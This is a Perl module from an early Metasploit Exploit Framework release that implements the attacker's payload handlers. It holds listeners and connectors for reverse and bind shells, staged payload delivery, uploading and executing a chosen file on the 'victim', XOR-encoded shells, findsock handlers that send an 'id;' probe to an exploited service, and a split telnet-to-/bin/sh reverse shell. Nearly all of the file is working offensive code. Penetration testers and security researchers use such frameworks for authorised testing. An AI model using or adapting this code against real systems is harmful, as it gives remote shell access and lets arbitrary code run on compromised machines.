#!/usr/bin/perl
###############

##
#         Name: HandlerCLI.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#  Description: Payload Handlers for command line ui's.
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Msf::HandlerCLI;
use base 'Msf::Handler';
use IO::Socket;
use IO::Select;
use POSIX;
use Pex;

use strict;

sub ConsoleStart
{
    my $self = shift;
   
    my $con;
    my $stdpipe = 0;
    $con = *STDIN;
    $self->{"CONSOLE"} = {"FD" => [$con]};
    return $con;
}

sub ConsoleStop
{
    my $self = shift;
    return;
}

sub Listener {
    my ($self, $proc, $port) = @_;
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $port,
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $s)
    {
        $self->set_error("could not start listener: $!");
        return undef;
    }

    Pex::Unblock($s);

    my $stopserver = 0;
    my $victim;
    
    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);
    
    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;
            $victim = $s->accept();
            
        }
        if (waitpid($proc, WNOHANG) != 0) { $stopserver++ }
    }

    kill("KILL", $proc);
    $s->shutdown(2);
    $s->close();
    undef($s);

    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"}; 
    return $victim;
}

sub Connector {
    my ($self, $proc, $host, $port) = @_;
    my $stopconnect = 0;
    my $victim;

    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopconnect++ };
    $SIG{"INT"}  = sub { $stopconnect++ };

    while ($stopconnect == 0)
    {
       $victim = IO::Socket::INET->new (
                    Proto => "tcp",
                    PeerAddr => $host,
                    PeerPort => $port,
                    Type => SOCK_STREAM,
       );

       Pex::Unblock($victim);

       if ($victim)
       {
            for (1 .. 4)
            {
                if ($stopconnect == 0 && $victim->connected())
                {
                    $stopconnect++;
                    last;
                } else {
                    select(undef, undef, undef, 0.5);
                }
            }
        } else {
            select(undef, undef, undef, 1);
        }
        if (waitpid($proc, WNOHANG) != 0) { $stopconnect++ }
    }

    kill('KILL', $proc);

    # restore the signal handlers
    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};
    
    return $victim if $victim && $victim->connected();
    return;
}

sub reverse_shell
{
    my ($self, $exploit) = @_;
    my $port = $self->GetVar('LPORT');
    my $victim = $self->Listener($exploit, $port);
    return(0) if ! $victim;
    
    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";

    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    
    my $console = $self->ConsoleStart();
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    
    $victim->close();
    undef($victim);
    return(1);
}

sub bind_shell
{
    my ($self, $exploit) = @_;
    my $host = $self->GetVar('RHOST');
    my $port = $self->GetVar('LPORT');
    my $victim = $self->Connector($exploit, $host, $port);    
    return if ! $victim;

    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";

    my $console = $self->ConsoleStart();
    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    $victim->shutdown(2);
    $victim->close();
    undef($victim);
    return(1);
}


sub impurity_reverse
{
    my ($self, $exploit) = @_;
    my $port = $self->GetVar('LPORT');
    my $victim = $self->Listener($exploit, $port);
    return(0) if ! $victim;
    
    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
   
    local *X;
    if(! open(X, "<".$self->GetVar('PEXEC')))
    {
        print STDERR "ERROR\n";
        print "[*] Could not open payload executable file: $!\n";
        kill(9, $exploit);
        return;
    }

    binmode(X);
    my $bindata;
    while (<X>) { $bindata .= $_ }
    close (X);

    print STDERR "[*] Uploading " . length($bindata) . " bytes...";
    # Verify that all data is written... 
    my $bsize = length($bindata);
    my $bres = 0;
    while ($bres < $bsize)
    {
         my $res = $victim->send($bindata);
         if ($res <= 0)
         {
            print STDERR " Error ($res)\n";
            return;
         }

         $bres += $res;
         $bindata = substr($bindata, $res);
    }
    print STDERR " Done\n";
    print STDERR "[*] Switching to impurity payload\n\n";

    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    
    my $console = $self->ConsoleStart();
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    
    $victim->close();
    undef($victim);
    return(1);    
}

# Multistage reverse connect payloads that result in a shell
sub reverse_shell_staged
{
    my ($self, $exploit) = @_;
    my $port = $self->GetVar('LPORT');
    my $victim = $self->Listener($exploit,$port);
    return(0) if ! $victim;
    
    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
    
    my $stagecnt = 2;
    while (my $stage = $self->GetVar('_Payload')->NextStage())
    {
        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
        $victim->send($stage);
        $stagecnt++;
    }
    print STDERR "[*] All stages sent, dropping to shell...\n\n";
        
    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    
    my $console = $self->ConsoleStart();
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    
    $victim->close();
    undef($victim);
    return(1);
}

# Multistage reverse connect payloads that uploads and execs result in a shell
sub reverse_shell_staged_upexec
{
    my ($self, $exploit) = @_;
    my $port = $self->GetVar('LPORT');

    if (! open(X, "<".$self->GetVar('PEXEC')))
    {
        print STDERR "[*] Error: Please specify a valid path to upload/exec file\n";
        kill('KILL', $exploit);
        return;
    }

    my $victim = $self->Listener($exploit,$port);
    return(0) if ! $victim;
    
    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
    
    my $stagecnt = 2;
    while (my $stage = $self->GetVar('_Payload')->NextStage())
    {
        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
        $victim->send($stage);
        $stagecnt++;
    }

    my $upload;
    while (<X>){ $upload.=$_ }
    close (X);

    print STDERR "[*] All stages sent, uploading file (" . length($upload) . ")\n";

    $victim->send(pack('V', length($upload)));
    $victim->send($upload);
    print STDERR "[*] Executing uploaded file...\n\n";

    my $console = $self->ConsoleStart();
    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    
    $victim->close();
    undef($victim);
    return(1);
}

# Multistage bind payloads that result in a shell
sub bind_shell_staged
{
    my ($self, $exploit) = @_;
    my $host = $self->GetVar('RHOST');
    my $port = $self->GetVar('LPORT');
    my $victim = $self->Connector($exploit, $host, $port);
    return if ! $victim;

    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";

    my $stagecnt = 2;
    while (my $stage = $self->GetVar('_Payload')->NextStage())
    {
        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
        $victim->send($stage);
        $stagecnt++;
    }
    print STDERR "[*] All stages sent, dropping to shell...\n\n";

    my $console = $self->ConsoleStart();
    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    $victim->shutdown(2);
    $victim->close();
    undef($victim);
    return(1);
}

# Multistage bind payloads that result in a shell
sub bind_shell_staged_upexec
{
    my ($self, $exploit) = @_;
    my $host = $self->GetVar('RHOST');
    my $port = $self->GetVar('LPORT');
    
    if (! open(X, "<".$self->GetVar('PEXEC')))
    {
        print STDERR "[*] Error: Please specify a valid path to upload/exec file\n";
        kill('KILL', $exploit);
        return;
    }
    
    my $victim = $self->Connector($exploit, $host, $port);    
    return if ! $victim;

    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
    
    my $stagecnt = 2;
    while (my $stage = $self->GetVar('_Payload')->NextStage())
    {
        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
        $victim->send($stage);
        $stagecnt++;
    }
    print STDERR "[*] All stages sent, uploading file\n";

    my $upload;
    while (<X>){ $upload.=$_ }
    close (X);
    
    $victim->send(pack('V', length($upload)));
    $victim->send($upload);
    
    print STDERR "[*] Executing uploaded file...\n\n";

    my $console = $self->ConsoleStart();
    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    $callback->("CONNECT", $victim);
    $self->DataPump($console, $victim, $callback);
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    $victim->shutdown(2);
    $victim->close();
    undef($victim);
    return(1);
}

sub reverse_shell_xor
{
    my ($self, $exploit) = @_;
    my $port = $self->GetVar('LPORT');
    my $victim = $self->Listener($exploit, $port);
    return(0) if ! $victim;
    
    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";

    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
    
    my $console = $self->ConsoleStart();
    $callback->("CONNECT", $victim);
    $self->DataPumpXor($console, $victim, $callback, $self->GetVar('XKEY'));
    $self->ConsoleStop($console);
    $callback->("DISCONNECT", $victim);
    
    $victim->close();
    undef($victim);
    return(1);
}

sub findsock_shell
{
    my ($self, $exploit) = @_;
    my $s = $self->GetVar('HCSOCK');
    Pex::Unblock($s);

    my $stopserver = 0;
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            print STDERR "[*] Got data from handler child\n";
            $stopserver++;

            # read the notification from the client
            my $hello = <$s>;
            
            # check to see if the exploit gave up
            if (! defined($hello))
            {
                print STDERR "[*] Exploit returned an empty intialization line\n";
                return;
            }
            
            chomp($hello);
            
            print STDERR "[*] Exploit: $hello\n";
            print $s "THANKS\n";
            
            # attach the exploit to the console
            my $console = $self->ConsoleStart();
            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
            $callback->("CONNECT", $s);
            $self->DataPump($console, $s, $callback);
            $self->ConsoleStop($console);
            $callback->("DISCONNECT", $s);
        }
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    kill('KILL', $exploit);
    print STDERR "[*] Exiting Findsocket Handler...\n";
    return(1);
}

sub findsock_shell_exp
{
    my ($self, $e) = @_;

    # this is our socket to the parent
    my $s = $self->GetVar('HPSOCK');
    Pex::Unblock($s);
    
    # this is our socket to the exploited service
    my $x = $e->get_socket;
    
    
    # print STDERR "DEBUG: self=$self | s=$s | e=$e | x=$x\n";
    
    # send probe string
    $e->send("id;\n");
    
    my $r = $e->recv(1);
    
    if ($r =~ /uid|internal or external/)
    {
        print $s "Shell on " . $x->peerhost . ":" . $x->peerport . "\n";
        
        print STDERR "[*] Findsock payload successful: $r";

        $r = <$s>;
        while (! defined($r)) { $r = <$s>; select(undef, undef, undef, 0.1) }
        
        $self->DataPump($s, $x, sub { });
        exit(0);
    }
}

# Handles telnet host port1 | /bin/sh | telnet host port2
sub reverse_shell_split
{
    my ($self, $exploit) = @_;
    
    my $sA = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $self->GetVar('LPORTA'),
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    my $sB = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $self->GetVar('LPORTB'),
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $sA || ! $sB)
    {
        $self->set_error("could not start listener A: $!");
        return undef;
    }


    # put servers into non-blocking mode
    Pex::Unblock($sA);
    Pex::Unblock($sB);
    
    my $stopserver = 0;
    
    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new();
    $sel->add($sA);
    $sel->add($sB);
    
    my ($connA, $connB) = (0,0);
    
    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        foreach my $s (@X)
        {
            if ($s eq $sA && ! $connA)
            {
                $connA = $sA->accept();
                print STDERR "[*] Connection to listener A from " . $connA->peerhost() . ":" . $connA->peerport() . "\n";
                next;
            }
            if ($s eq $sB && ! $connB)
            {
                $connB = $sB->accept();
                print STDERR "[*] Connection to listener B from " . $connB->peerhost() . ":" . $connB->peerport() . "\n";
                next;
            }
        }
        
        if ($connA && $connB)
        {
            print STDERR "[*] Both connections are established, dropping to shell...\n\n";
 
            $stopserver++;

            # terminate the exploit process
            kill(9, $exploit);

            my $console = $self->ConsoleStart();
            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
            $callback->("CONNECT", $connA);

            $self->DataPumpSplit($console, $connA, $connB, $callback);

            $self->ConsoleStop($console);
            $callback->("DISCONNECT", $connA);
            
            $connA->close();
            $connB->close();
            
        }
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill("TERM", $exploit) }

    # clean up the listening sockets
    $sA->shutdown(2);
    $sB->shutdown(2);
    $sA->close();
    $sA->close();


    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};

    # return back to the calling module
    print STDERR "[*] Exiting Shell Listener...\n";
    return(1);
}


1;
